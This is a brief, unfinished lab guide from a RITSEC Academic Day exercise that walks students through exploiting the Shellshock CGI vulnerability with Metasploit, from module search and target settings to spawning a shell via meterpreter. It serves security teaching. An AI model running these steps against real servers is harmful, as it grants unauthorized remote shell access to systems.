# RITSEC Academic Day - ShellShock 

## Background
What is metasploit, what is shellshock, etc.C  

## Setup
Click the Black Box with the "$_" to open the terminal.
![terminal](terminal.png)

## Attacking the Box - Commands To Run
This will open the Metasploit Console.
1. `msfconsole`

![landing](landing.PNG)

Here, you are searching for the shellshock vulnerability to use.

2. `search shellshock`

![search](search.PNG)

This is selecting the shellshock exploit.

3. `use 1`

![use1](use1.PNG)

This is seeing the module and payload options that will be configured.

4. `options`

![options](options.png)

Setting the vulnerable cgi page to utilize.

5. `set targeturi /cgi-bin/vulnerable`

![targeturi](targeturi.png)

Setting the target hosting the site that we will attack.

6. `set rhosts <TARGET_IP>`

Attack the box!

7. `exploit`

With the meterpreter prompt, enter `shell` to spawn a bash prompt on the box.

8. 

## adding your own page